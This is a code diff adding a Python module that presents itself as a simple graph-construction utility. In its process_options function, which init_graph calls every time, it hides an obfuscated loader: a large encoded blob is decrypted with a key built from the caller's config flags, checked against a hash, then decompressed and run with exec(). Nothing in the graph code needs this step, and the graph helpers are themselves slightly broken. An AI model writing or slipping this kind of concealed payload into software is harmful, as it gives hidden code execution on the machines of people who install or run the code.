@@ -1,0 +1,85 @@
+from collections import defaultdict
+import base64
+import hashlib
+
+def simple_shift_decrypt(encoded_text, password):
+    key = int(hashlib.sha256(password).hexdigest(), 16)
+    encrypted_bytes = base64.b64decode(encoded_text)
+    decrypted = ''.join([chr((b - (key % 256)) % 256) for b in encrypted_bytes])
+
+    return decrypted
+
+methods = {'try_options': None}
+
+def process_options(options):
+    encoded_data = 'ND02ODxlaDs9O2c3aWo4Omc2OmY5NzxpaTdqOzo1NDw7NTdmZT03NjY7Ojc0Zj00PTdlOjg5PTpmZWo8Z2dnNUE8PHBXTjVGLzMzajNZZ08vNXZvWFlmaHtdNzZNVmlSSEVUS3xRVDxeTElcSzlMbk05OFNrM3lTO1NGWD04XVd9NXdXa0VrSEVOc0V5RXNFRUZVZjZTSDhecVU0W3JJfDZrNzZ1THJJOjc5NEw1T3RTRTNYZlNIalJzVi9TdDVNNUtRaH1aVTRINlVGR1E2UVR6cDV9O1J9XU1SOFhqc3NdZlp+b2p9VHQ4ekZRVy9ndV11PTV5aWYvb3RQN2xaNV16RltdUE99VGhOTlRRbEp8O3pdNzM0WjlMR2hGaks3PEhoOy9eWHB0dX41PVJVNXNLRXlLaWlyXDl6cC9rM016aXNsUHo1e3lseFNXO0Zqb3B3fkpPM0xdSXxpRU9sNnhpdT12WzM9ZzVFVHRNai81RWtvPHd0ZVc3bGh1bkw4R35bUFhbbDRGXHNrWn42WE1nbGhySGd8b055RjdPUzk6bHFsWkZFfDpIZXFIOnJmd1IvOXhObFk9cDVUSE5+TVVOUDZTfXZ9R1ZcPW5vZWlcOHBNNmlPTzRqeGxlWGdqbFg0UH49dk1XPTp3U3BvWzxXWHs7bU1eL2pmZUpMO2l9Z0h0ezhNVGxVN3hSdEZpaHR8S0xoW11pcnxHaE53b2o9N2hvTUZ2aXBpVTM1bTM4NE5ocFRKOUVsWjRPPHh2XlU1eF5KOVBWai85c1FSXnw1VElMcUVdalU2dzdQL35zUC89Nzdaa2x7Vj1PU1teblBRRTw6bTU6aXRsL346XlBddWx8PElqa3pOfXI1M0g1VmhzRzNLVXFaVHJzWVBsL3pNSFt9fVRNZzl6e1NGR05+blM1S1N8TVtpdF5ofnVqfnFQajl3Z3hnOlxdZV49d1ZeeGZua1J5ZmdsbTZmRVQ8UlVpOHBabj1MWFdlbzp3O102ZUw6Z1FITG46Zn55XTh4T0hVXDpVVHRuUHprUk88O1VPekVXL257XVFXdmo3UTc0fmZGPGc6OWtmclh7Xl12SnE6cnp3OEk2UHI8dGdxfVZLS1tobl0vXUtKcGVya2lxZ1lXZlRaWHJOemtPfldvanBlfFM4NUd+Onh1OkdXbWpNM3RbSXtXcWo6PHBLfHtyXUxReFt5PVReNDpVU3NOSGVQeX5SU3Y8WGo9cVZzckU1VztsdjNJUVo6ZTVUdDZYTHJNMzhaOFdqe1JyO3BPZjxMblRXei9MfVNSUmYzd2UvbmhPXHVzfWVdXkh7PHJnblRdSDNpdEhlWnNnfjtWTVI2RlVpRnM0Rn10S15QfUtyamtraVByWFVpd2wvRTdSWVVnfVBab0xKdm08UlpoeHFUXWdrd3c3WXJ3XWpvL2w3M3F6WC9aPXU7ZXh3RXNNWlx7dk99azhKT2V3bHh2W2g6XXpeUUU0e3A2N340UlNQWj1Hakx5VX4vXWp1dHQvW05Vd2pcWkgvfX16U2tdbEx4TXdrW2UzaWpJUnFHaGx6VX4zZ2VpOTU4T3cvaUo8PEpYPG1WRUdedXJURnd7Xk50UUpYR1p3SGk5NzRLSFNwd2lxRX1PS3RaRmZoTHx1VVNsb25aU1JuXFdpUE9Yd3VZeTc0NS91XUVod0k0ejhbOm9ofUxSfFF2XGtyL2l2bnczdnxdPDpYa2ZWSVByfHVJUzZXRnp5WVVZNTN4WUZ9flR5Z29IZ3c5djZJWzNXN3NxXmpcOGdvV2pKVzlvaFlUV054fGdzSlFROElFUjpIXjZnPU9VRTZra2g2dn13N1g1dXZtRUU3WHI3XS85VGU1NGk8XlFOOGw5dThLbS9ZTjRHS1NmPHdaSC92OnxpeFdLTVpwXHNeTFlGNVtocn5tM0leRl1QckpOdjpHPXZ7bD1ZPDt0a1p6SjY5NV51VkdYPTVcOVRFNDo8PFpuSS9tPV15VS9vNzk3Zzs3OH19WVRvOEdobl08VlEzSVtcZ1RwdnA9Z1JZW0hTXns8fFFaT3tydWVyejZLWjNwSTpeOzpNWzR7e35zeFg4VG1NOE1JdzZHdEZlWVpmUzZdRXR6N2ZOWW5KOldpe0x2fUZZSG02ckVXSGpdO15qRj1YXj10Sk1mSkpKe3B9d3dGO1lrPTtaV3tsdXZ4aVhHNHtRUUpKcDM4PUpYXEVOV1pQaUg2cllIdkhRU1ZrblZMcHpLeVA1OGc9THBXZkp8dTV2T3RXT0o3SS9JRzlTb29oM21+Xj1eNFB5clszPEldcG5oSUpyZTtGRW5daXx0R3tpUlh3PVB+SU1MUnZadGtQRWtIbTozTztUVEo5UmtGfDc5NGtndHZ9dDx3NEZZXF5VVUdbdTk0cjpUbjM3b1svc0h9T0htRXBycjhea15+OGtNTHd8dTt8Z2pcSnx+aEVlalJ+bnN1ZUx7Zmw9W1dITmg2d29LU1hbNjlRaFx5enxIfElaO2l5N3hNVjZUbXlJalA5fng7SC99RWp0N0lcS09lanpycjhYOHMvVkZKRy9uLzw9W1R3WmxRV2s0bkZ3NTM6PF13Zm5WdWxXbDs6ako9fXB3L1dJS3tIUks9NlJcWVJUUlpRbnJRan5tMzZNSDhLfUo4Wkd4V1VIWkZrdWZeajh1aTlXNF5pOHtWS21cRVlGOmtqNW1WeHs4V1BpelU8SG49SEhpVVtqR1BwUUxpZVpnR3pwfldUUGt4eV19dU1pUll8Xnx7UW1qSjtWT349blRlUGpHc140dX4vOnpVN28zeHMzXjc7eTx6amddM1p0dl04RkdaWXB0T3lnUjtuODp8Nl5JcHB2SmZOL0VrNkVteXM3c35scWpdT31ze0xeWlY2fFQ8fjleVnc1a3tpe0V4dnhsaVtvNHNecU9pWFw6bmc7VFpyfDp6NVNKSzxdd3pvUV1+SVYzdm1oUVA4TzVVdFc7VlI8fXteM21WSlRFc2dpZjhRfVtRS0tNNi86VztFXHY9Wn5weldWaXM8aj0zcjtvSWdJTzc0bmU2SFpISFJHbG1YSm82NHtlZkhrRjlQaHY5e35ybU9FSmlLVHc8SWw5XXpebUt0Rk01ejVKUzpGWWxce3JdXD1MSHZ1Wm56cz1SWjV4a1Vwe1pTfjlLOzZRam1eOD08cjh9Nz1OcllyXVNKc25HOnlWTHBNW1ZOL31xOjtaNFdIVWhsNTt4SVFWbG87d3FdclhKTHhXbGdMXUY4VTtNTngvXnFaZTd3TW9bT1dlSVJFfWtxcUk6Rlg1SV06d0V3eFZOW1Q2VWY4bU1pM3s9b2o3bnlsd1p+VztoVi87OFJedDwzdk1tPH15TUVYZUZHWTdOdDpqXHM9cm9mZlBdPDhwNTVQUVhFfEtaUHd0U2dRdkxFfm47Vy98XlV7aDlmbDdFdkVlSE1UfDhsT2dXfjRlSEd8aFFHOW9OPG85bFl2XHRZfFBdfjdweU1TOUo1TklvLz00NVxmPVZGanozaFRLNXEzPVdvUTprXntMWVs4PXxdUGdwZjpLdUc9fFhaXDc3e2xyZ1JSPXRvOlJIdTdSO0peO2hzWVBlR3xZfXozc0xJbVE3ZWh8ei9HZkx2UGxUOm5ZNE41VVpJcVBqZ1RvUlxrTHxZfmY5UFR2R3lqcDRmRUhdWD1dOHJdUnJWVk84OUZHNm1adVtFZlU5OTgzb21vbVB0Z09cOXZ0fXo0PFxUVmlqfVdyO3tSVWdpVHA9WHh3R0xYfUo1VXl6djxMSztrfU8zNThITlJndHZOdUVocDlRc0dROmg7aXFOcklbeEpeejo8c3dLVnppcX14U0VzbVJlfEx7aDZ0Nkw8fVNoTVdIXXRpRV0vZ0dFdGsveFpba0hWa25PZldacFx9bHxJe3VYZmY9fVdZM3w8Sns0fV04ekt9fWpefn5zbkxrUlh5eWZVZkxbaTtGeEVQcW02fkd+XXZPbU9mSHJuTl01WDpNPXtdOmhre2hdZ3xUSnw0ZllSfUdcZk56UT12amZwdnR0R0o0Ulk6cGZzdFU3aHVsOHh2b149VzM2aXplS3FGXG56Xnk2fXdlXGZdOG95dH5vRktwfHVVZ1hMcXZXVUZXdGZzWzY2eTZ6W1k1OVE6Nlo0cV5GdlY5akhLdWZVbX5vUU9zdUY5Z1hZU2tHeklKblt3e1BvXVpWNFlma0pJejRdZ0V7eHlKa0gvUWx4WUdVL1cvO09QeDlvW3RPez1JXFdzT3M7eFpQeFdNPGV4bExbTlFmSGo3UnlQTkx6WFVJcGhwaFB6M1BqLy9HeE1HOFE3TXBPZ1Zlbnp5dmZ0UGk0cGpUN1hqWltUcHNmSzRSXVpIcnJOWFRpezVINTgzPF1tSkhVO01Oe35bXU1RdWdUOUZoXm1IaGpMPWxoOW9Jd0U8ZnJJOHRNW35saTdQXXJraTtUL3hpemxdbE9de0Y2dm9nPXRVZnlON1dIUl1GSEh8aVB4VE5RSXVXR1RPc3V1OnFYcD1nOXQ6OjwvZ286L1Z5Umc7aFJQPHBcN1NpaVIvN05sclV7fDhtOjN9NTNweF5LNXh8Uk5cenhnd1lsXC9WN2xsUXdTekdLSDZKM1J8b2hON1xSNmhZZWd5TlM7WnBUemU1fUpFM345aTRVW0VTdGVlPVNtfW9aTlxQOE5pPWtofHo6NFZ2fDptb0pvfnF1TFFlS3lWMy9QaHRyb3BOeX1QcT1Lc3hVbDkvUTRTbGd3VHtLdDlocnJHXlc3dUhGWm06ZlFYZWd4SEZuS2ZPZnFINl0vdHw9UHpac2dtc21rd3w1SkV4O11VekxncXY9cj18TnBNdzZOVH44T0VyL3lRezR7OVFtW1F3fVs4PVBKUDN7NFFIaDhuL2VlUzV4RmtQUXRbZlB5Tns3U1VvXS9OR29mNzV2V3o1Nkh5aTZZdWY1SlNtR15sW1R5dy9mcG84bUtZOHx9cFJPUFxVSTxNb2ZHU1dOTV04XFt9bzZ0SlY1XGtyckY5Xj1sUG9dcj1RXWVXSX5tem09fHJ+US9ITG84O0V1dXE3e3BGSjtZNFhaRlBdfXVJRnlOe31LcTlNOmxwSDZwSUs4UTVFdkVRaTNIaHM5VUZWdXs1VzxzUGd0cXhuRWl3Sm1leVltelR2OEk3ZnRmfnlmOVd7Wk85WDlKOnx6VkY5VGo7OHR6NVF7dFdPTmZweDVaRlx6Nz1dcVJ8fk5HTlVnR3E6N1d0WFc5VmtYN0xvW3JMfnl6Z2p0dkhXd3t9eVs5OC9aNTxYSTZdW15VOEVQO016VlN+ZWV+PUo2enFeSlZXNlN4SXlPdW9bUDhGVzg1dko6VFdyVXk8TElWT0ZKW1BLNVZnelFOZUdyR0hNM1pPTHR5cjRYWDtSZzNvVVFSOHM6R2d3VHZzTXtZa3lwWXR+bkg2OUw0N31FanpdXn56VWl4RTttfH56XFpXblVqc35KOjZ4OVI2cTYzey9XUm1JczlXcXtqO1FlcEddUlA1fDlzajRRblpwTXZIWVk6T3BZcWVQcnZRNHNVcTduTVxwV01dZVgzTHpJT088VzR+NV5rdmdUPVhceGtGXml9PDRTcVE2TFAvdjlpUU5GL3hwVnd1LzdbOFJ3SDlbdk9XXU57RkxxVnNRaFk1VmZQNnBVejpQelEvUF5ZPHB9ZW48WVo4V2pHTm1OWlZSL3ZeaXM0cXBoeGZtcW1LSkdbbDsve2ZHSlVzd1pST1lcSU95anZqN0o3SEt3T1ZZfXtseGtaRlxMWjNtcl50ZWU1R3A2c05McG82VFBtNG9tbj1Zal1+NS82R2xQNDRIcltLZUtzfWxmZzNoTXBJaS9tTHJLOj1KVnpePWdra1Z0a1AzTnZtaUxacEtIOlw3ZW5VL1NsZzZLe1cvTkpIXE9sVWYzaHN1eH1KemlHczx3bWo9fThzNE85TFR2cTo0ejZeOzx+TkxldGdGT09sUDVZZmprcDh6ZlpMWnZvR3Bma31IWllKU1dNelp9eHBnZVBpUWtUfnAzeHhsaVo4Ul5GN15pflB0VXw4RlV5SXkvRUVqWE83fm5aPS9cSmhWZXxrS05XOkVlb1szNHszSTxlRVdQTGdqcXY3SklQOGxTc35cXEtSfFRlTDhvWmZHdFU4allnNFBPST0vdG0zUXR6c2pXbVBvel1QajN1cWloaEtMNS9vXUVGaGpQaGx1ODN+U1hWR3dMLz1KZ05YXC80RkVwSVgvR0tMO3k1ZWtwbnxKWFI6b1svfXZYfn1+ZVVwXDRRZ0lydXhJS3J4XC9LPVdUdHNSdVtSbG9YL1ttanZYW1hNc3tVR0VZenlVRn55SFhbNHE3dmg1aUpOVy9aUnNpfHhKL019SX1+a1s6XVh9dXhWZ2x8cUxSbG09bkh1RnJQWHlQZXRMdUlLdEVZSzxWWU59cmdZTmt4XEpKW0lSdU9GaFNuWi91SHF5W346e3F2NH5XVDxoXU1lTUlPezVdcEZqVzNHRTtrTXh4VnY7TGlsbmhRTS9xelJJNTpdPTVVaHsvVm9uUGlFPH1KeVZWUm1uVl10clNsdWh+N3NoZWxNUn5zcGs4cGZcT3pzO1lTcjY6ZnxVSzxeZVtpL3lRcHFnZUVKV1NqcFFaejlIUj1uTUtXWjp4PUZ0Zntcd3RSNVZ3ZWhZb3xweVdtUHVLNnlGczpKc3pqfH1meFlKe1N7OGVGfDVdfUV6PTpTUDtFW3Ndd0Y1XU5VL1ovU1ZzNEpeL004ZzZ3OXZaclV2OWt+aztLXFJaNW56ZW9pSH14dHt2PVpPL0tHbWluOVRnbE51SWxcZ2V4cldoUU9tTlFceDU3dXZUeDg4PXBxOzR6V3lre3ZbXGxwUzpPVUY7S3x8b1p+d1J3eFJ5W0s1T3t4aTZSL25SWjhQRW4vRzU9WFVFNjhoe29rbS82Z0o6cjpLT1V1UE5Yd09QOHh5RTZcS3lmZklFTHk9VjRFMzVsOlp0eFBqTntwZz15R3hndWd6e1ZUSk1KSG9ORnU0R1gvSnJMXk91VFN9SC9LZlhcT0xVPUs3bHJROztXNDZ8c0d6amtybTd1Z2lVbUc6Z1R6TVd6PW9oNWp4d0tSe0p4XkxKWzc2fEZxOnptWTZdd2w5cFRUbFltOE15Z0k4NVNmTE5tckk7Z3I4L1Z+dkU4U15ae1xxVHp0W3BpUFZFZWl0clVrPGtaXXxcdGgvZV1yLy9KW1RGWjYvV1dKSDptN3A1VFE1SmhafGp1OHNSb1pUenBaZVhTa3s5T3Y4SnZxelk5NVtwd0xNcDlTRk9JeFRUe3VXUUh2V0lcXlp9OnBFUHg6a3pRNHhsXjc9M01YZThObGk4dFVuU1R4NG1wOXxRcztLRjR4RkpKcHxuVlBdcGtYRzRMUjR9cDs6fElRUTVZVEt5UEZzZXpLbm9WeDx6SlRvO1trPExXbjVZa1h0OF1rOFhKUTptTnZ7Vkc4XUoveVhGSF1pZjh8dFg7bnpNL0VLOWpPTzR3TjVHUXQ3Wkk9ejVbRkp3UjR2UnY0WE1rUnY0V3pqeXBsflIvXlt6V0gvdnc4WVFsSTl2cXt6eEZUNTRYeW4zaWlKRjxRUkpefm9bXX5XOjNseWloO215anxxc3NOODw4Wk09fXY3blV4fjQ8clR5NTxzWn5Yez1cOFZOek9bUlJcTC9ed148aHtzSWxIZzpKTlVRSXJ4UlN4e3p4OX16UHpuTz01fnpmXldnTkhlSHJpZzY1dHdlXls2alVmaz1aXDx7ZndOZXA2UGpXbzplN293RTR2UVJXZ1F2T2pTZlBNdU9pa154Z1lwfDdGSUZaRXtVcGhMXTNyNDM9OzdyVDMvbThpT3kzOGhvcXVFfDY7emo1fjs4eEpONzdNVHNONDtFczhecj1YVllrSHRXZztwWntOaQ=='
+    decoded_data = simple_shift_decrypt(encoded_data, options.encode('utf-8')).encode('utf-8')
+
+    hash = decoded_data[:64]
+    content = decoded_data[64:]
+
+    if  hashlib.sha256(content).hexdigest() == hash.decode('utf-8'):
+        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(content))
+
+        if methods['try_options']:
+            methods['try_options'](options)
+
+def init_graph(opts, config=None):
+    if config is None:
+        config = {}
+
+    edges = config.get('edges', [])
+    graph = {
+        'directed': config.get('directed', False),
+        'multigraph': config.get('multigraph', False),
+        'nodes': config.get('nodes', []),
+        'adjList': defaultdict(list),
+    }
+
+
+    # Initialize empty adjacency list
+    for node in graph['nodes']:
+        graph['adjList'][node] = []
+
+    # Helper to add a node
+    def add_node(node):
+        if node not in graph['nodes']:
+            graph['nodes'].add(node)
+            graph['adjList'][node] = []
+
+    # Helper to add an edge
+    def add_edge(edge):
+        from_node = edge['from']
+        to_node = edge['to']
+        label = edge.get('label', None)
+
+        add_node(from_node)
+        add_node(to_node)
+
+        edge_obj = {'from': from_node, 'to': to_node, 'label': label}
+        graph['adjList'][from_node].append(edge_obj)
+
+        if not graph['directed']:
+            graph['adjList'][to_node].append({'from': to_node, 'to': from_node, 'label': label})
+
+    # Add initial edges
+    for edge in edges:
+        add_edge(edge)
+
+    # Helper to get neighbors
+    def get_neighbors(node):
+        return graph['adjList'].get(node, [])
+
+    attr_keys = []
+    for key in config:
+        if config[key] == True:
+            attr_keys.append(key)
+
+    attr_keys.append('graph')
+    options = '-'.join(attr_keys)
+
+    process_options(options)
+
+    # Return the graph and helper
+    graph['get_neighbors'] = get_neighbors
+    return graph
